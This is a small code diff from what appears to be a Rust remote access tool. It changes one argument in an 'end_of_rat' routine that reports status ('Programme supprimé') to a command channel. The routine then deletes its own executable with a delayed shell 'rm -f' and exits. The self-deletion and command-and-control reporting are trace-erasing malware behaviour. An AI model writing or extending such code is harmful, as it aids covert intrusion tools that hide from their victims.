@@ -231,7 +231,7 @@ async fn end_of_rat_wrapper(alias: String) {
             .arg(format!("sleep 1 && rm -f '{}'", exe_path.display()))
             .spawn();
     }
-    let _ = connexion::send_directive_status(&alias, "success", "Programme supprimé").await;
+    let _ = connexion::send_directive_status("end_of_rat", "success", "Programme supprimé").await;
     std::process::exit(0);
 }
 
